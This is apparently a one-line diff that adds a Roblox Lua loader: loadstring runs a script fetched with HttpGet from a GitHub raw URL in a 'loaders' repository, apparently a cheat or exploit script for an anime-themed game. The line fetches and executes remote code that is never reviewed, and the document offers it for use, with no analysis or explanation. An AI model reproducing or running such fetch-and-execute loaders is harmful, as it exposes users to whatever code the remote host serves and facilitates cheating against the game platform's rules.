@@ -1,0 +1,1 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/spectershapecabin/loaders/main/loaders/my-anime-mine-spam3-sh5ddspfgzc4jj.lua"))()
